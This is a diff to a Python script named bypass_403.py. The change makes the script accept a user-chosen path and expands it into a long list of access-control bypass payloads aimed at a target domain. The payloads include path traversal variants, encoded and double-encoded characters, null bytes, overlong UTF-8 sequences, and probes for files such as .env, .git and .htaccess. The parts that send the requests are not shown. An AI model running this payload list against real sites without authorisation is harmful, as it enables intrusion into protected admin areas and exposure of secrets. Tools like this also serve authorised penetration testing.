@@ -3,40 +3,43 @@ import sys
 import threading
 
 # Check if domain argument is provided
-if len(sys.argv) != 2:
-    print("Usage: python bypass_403.py <target-domain>")
+if len(sys.argv) < 2:
+    print("Usage: python bypass_403.py <target-domain> [optional-path]")
     sys.exit(1)
 
 # Target domain from command-line argument
-base_url = f"http://{sys.argv[1]}"  # Change to https:// if required
+base_url = f"http://{sys.argv[1]}"  # Change to https:// if needed
+
+# If user provides a path, use it. Otherwise, use default paths.
+user_path = sys.argv[2] if len(sys.argv) > 2 else "/admin/"
 
 # Common access control bypass techniques
 paths = [
-    "/admin/", "/admin/?", "/admin//", "/admin///", "/admin////",
-    "/admin/./", "/admin/../", "/admin/././", "/admin//..//",
-    "/admin%20", "/admin%20/", "/admin%09", "/admin%09/",
-    "/admin%0a", "/admin%0a/", "/admin%0d", "/admin%0d/",
-    "/admin%23", "/admin%23/", "/admin%3f", "/admin%3f/",
-    "/admin%25", "/admin%25/", "/admin%2f", "/admin%2f/",
-    "/admin;%2f", "/admin;.json", "/admin;", "/admin;/",
-    "/admin?.json", "/admin??", "/admin??/", "/admin?id=1",
-    "/admin&", "/admin#", "/admin./", "/admin~", "/admin/~",
-    "/admin*", "/admin/*", "/admin;/", "/admin..;/", "/admin../",
-    "/%2e/admin", "/%2e/admin/", "/%2e%2e/admin", "/%2e%2e/admin/",
-    "/././admin", "/admin/..%3B/", "/admin/;%2f..%2f..%2f",
-    "/..;/admin", "/..;/admin/", "/.;/admin", "/.;/admin/",
-    "/admin.css", "/admin.html", "/admin.json", "/admin.txt",
-    "/admin/?.php", "/admin.asp", "/admin.aspx", "/admin.xml",
-    "/admin/.json", "/admin.%00/", "/admin%00", "/admin%20.json",
-    "/admin/;", "/admin\\", "/admin/\\", "/admin\\/",
-    "/admin\\..\\", "/admin/..\\", "/admin/%2e", "/admin/%2e/",
-    "/admin%252e%252e/", "/admin%252f/", "/admin%253b/",
-    "/admin/./..//", "/admin/.//.", "/admin/..;./", "/admin/..;/%2f",
-    "/admin/%c0%ae/", "/admin/%c0%ae%c0%ae/", "/admin/%u2215/",
-    "/admin%u002e%u002e%u2215", "/admin%u2215/",
-    "/%2e%2e/%2e%2e/%2e%2e/admin/", "/%2f%2f%2fadmin/",
-    "/admin/~dev", "/admin/.git", "/admin/.svn", "/admin/.htaccess",
-    "/admin/.DS_Store", "/admin/.well-known", "/admin/.env",
+    f"{user_path}", f"{user_path}?", f"{user_path}//", f"{user_path}///", f"{user_path}////",
+    f"{user_path}./", f"{user_path}../", f"{user_path}/././", f"{user_path}//..//",
+    f"{user_path}%20", f"{user_path}%20/", f"{user_path}%09", f"{user_path}%09/",
+    f"{user_path}%0a", f"{user_path}%0a/", f"{user_path}%0d", f"{user_path}%0d/",
+    f"{user_path}%23", f"{user_path}%23/", f"{user_path}%3f", f"{user_path}%3f/",
+    f"{user_path}%25", f"{user_path}%25/", f"{user_path}%2f", f"{user_path}%2f/",
+    f"{user_path};%2f", f"{user_path};.json", f"{user_path};", f"{user_path};/",
+    f"{user_path}?.json", f"{user_path}??", f"{user_path}??/", f"{user_path}?id=1",
+    f"{user_path}&", f"{user_path}#", f"{user_path}./", f"{user_path}~", f"{user_path}/~",
+    f"{user_path}*", f"{user_path}/*", f"{user_path};/", f"{user_path}..;/", f"{user_path}../",
+    f"/%2e{user_path}", f"/%2e{user_path}/", f"/%2e%2e{user_path}", f"/%2e%2e{user_path}/",
+    f"/././{user_path}", f"{user_path}/..%3B/", f"{user_path}/;%2f..%2f..%2f",
+    f"/..;{user_path}", f"/..;{user_path}/", f"/.;{user_path}", f"/.;{user_path}/",
+    f"{user_path}.css", f"{user_path}.html", f"{user_path}.json", f"{user_path}.txt",
+    f"{user_path}/?.php", f"{user_path}.asp", f"{user_path}.aspx", f"{user_path}.xml",
+    f"{user_path}/.json", f"{user_path}.%00/", f"{user_path}%00", f"{user_path}%20.json",
+    f"{user_path}/;", f"{user_path}\\", f"{user_path}/\\", f"{user_path}\\/",
+    f"{user_path}\\..\\", f"{user_path}/..\\", f"{user_path}/%2e", f"{user_path}/%2e/",
+    f"{user_path}%252e%252e/", f"{user_path}%252f/", f"{user_path}%253b/",
+    f"{user_path}/./..//", f"{user_path}/.//.", f"{user_path}/..;./", f"{user_path}/..;/%2f",
+    f"{user_path}/%c0%ae/", f"{user_path}/%c0%ae%c0%ae/", f"{user_path}/%u2215/",
+    f"{user_path}%u002e%u002e%u2215", f"{user_path}%u2215/",
+    f"/%2e%2e/%2e%2e/%2e%2e{user_path}/", f"/%2f%2f%2f{user_path}/",
+    f"{user_path}/~dev", f"{user_path}/.git", f"{user_path}/.svn", f"{user_path}/.htaccess",
+    f"{user_path}/.DS_Store", f"{user_path}/.well-known", f"{user_path}/.env",
 ]
 
 # Headers to mimic real browsers
